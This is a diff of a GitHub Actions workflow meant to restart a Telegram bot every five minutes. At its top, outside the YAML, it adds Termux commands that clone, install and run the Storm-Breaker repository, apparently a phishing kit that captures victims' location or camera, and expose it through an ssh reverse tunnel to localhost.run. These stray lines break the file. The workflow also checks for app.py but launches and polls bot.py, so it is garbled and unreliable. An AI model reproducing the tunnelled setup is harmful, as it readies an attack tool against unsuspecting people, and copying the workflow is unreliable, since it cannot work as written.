@@ -1,35 +1,151 @@
-name: Run Telegram Bot
+
+
+pkg update
+pkg install git
+git clone https://github.com/ultrasecurity/Storm-Breaker
+cd Storm-Breaker
+bash install.sh
+
+
+
+
+
+
+
+
+pkg update
+pkg install git
+git clone https://github.com/ultrasecurity/Storm-Breaker
+cd Storm-Breaker
+bash install.sh
+python3 st.py
+ssh -R 80:localhost:2525 ssh.localhost.run
+admin
+
+
+
+
+
+
+
+
+
+
+
+name: Telegram Bot Auto Restart - 100% Guaranteed
 
 on:
+  schedule:
+    - cron: "*/5 * * * *"
   workflow_dispatch:
   push:
-    branches:
-      - main
-  schedule:
-    # Cron: প্রতি 5 ঘণ্টায় workflow চালাবে
-    - cron: '0 */5 * * *'
+    branches: [ main, master ]
 
 jobs:
-  run-bot:
+  guaranteed-bot-restart:
     runs-on: ubuntu-latest
-    timeout-minutes: 300  # Maximum runtime 5 hours
-
+    timeout-minutes: 15
+    
     steps:
-      - name: Checkout repository
+      - name: Checkout code
         uses: actions/checkout@v4
 
-      - name: Set up Python
+      - name: Setup Python environment
         uses: actions/setup-python@v4
         with:
           python-version: "3.11"
+          cache: 'pip'
 
-      - name: Install dependencies
+      - name: Install and verify dependencies
         run: |
-          python -m pip install --upgrade pip
+          pip install --upgrade pip
           pip install pyTelegramBotAPI requests
+          # Requirements.txt থাকলে install করবে, না থাকলে basic packages
+          if [ -f requirements.txt ]; then
+            pip install -r requirements.txt
+            echo "✅ Requirements installed from requirements.txt"
+          else
+            pip install requests python-telegram-bot telethon python-dotenv
+            echo "✅ Default packages installed"
+          fi
+          
+          # Python file check
+          if [ ! -f "app.py" ]; then
+            echo "❌ app.py file not found!"
+            exit 1
+          fi
 
-      - name: Run Telegram bot
-        env:
-          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}  # Your bot token in main script
+      - name: Force stop all previous instances
         run: |
-          python app.py
+          # সব Python bot process kill করবে
+          pkill -f "python app.py" || echo "No running bots found"
+          sleep 3
+          pkill -9 -f "python app.py" || echo "No bots to force kill"
+          sleep 2
+          echo "🔴 All previous instances stopped"
+
+      - name: Start bot with monitoring
+        id: start_bot
+        run: |
+          # Screen ব্যবহার করে run করবে (যদি available থাকে)
+          if command -v screen &> /dev/null; then
+            screen -dmS telegram-bot python -u bot.py
+            echo "✅ Bot started in screen session"
+          else
+            # Alternative method - nohup ব্যবহার করে
+            nohup python -u app.py > bot_$(date +%Y%m%d_%H%M%S).log 2>&1 &
+            BOT_PID=$!
+            echo $BOT_PID > bot.pid
+            echo "✅ Bot started with PID: $BOT_PID"
+          fi
+          
+          # Wait for bot to initialize
+          sleep 15
+
+      - name: Verify bot is running
+        run: |
+          MAX_RETRIES=3
+          RETRY_COUNT=0
+          
+          while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
+            if pgrep -f "python.*bot.py" > /dev/null; then
+              echo "✅ SUCCESS: Bot is confirmed running (Attempt $((RETRY_COUNT+1)))"
+              exit 0
+            fi
+            
+            RETRY_COUNT=$((RETRY_COUNT+1))
+            echo "🔄 Retry $RETRY_COUNT/$MAX_RETRIES - Bot not found, waiting..."
+            sleep 10
+          done
+          
+          echo "❌ CRITICAL: Bot failed to start after $MAX_RETRIES attempts"
+          echo "📋 Checking for error logs:"
+          ls -la *.log 2>/dev/null || echo "No log files found"
+          cat *.log 2>/dev/null || echo "Cannot read log files"
+          exit 1
+
+      - name: Final success notification
+        if: success()
+        run: |
+          echo "🎉 TELEGRAM BOT AUTO-RESTART COMPLETED SUCCESSFULLY!"
+          echo "🕒 Timestamp: $(date)"
+          echo "📊 Process Info:"
+          pgrep -f "python app.py" && echo "Bot PID: $(pgrep -f 'python.*bot.py')"
+
+  notification:
+    runs-on: ubuntu-latest
+    needs: guaranteed-bot-restart
+    if: always()
+    
+    steps:
+      - name: Workflow status
+        run: |
+          if [ "${{ needs.guaranteed-bot-restart.result }}" == "success" ]; then
+            echo "✅ Bot restart completed successfully"
+          else
+            echo "❌ Bot restart failed - check logs"
+          fi
+
+
+
+
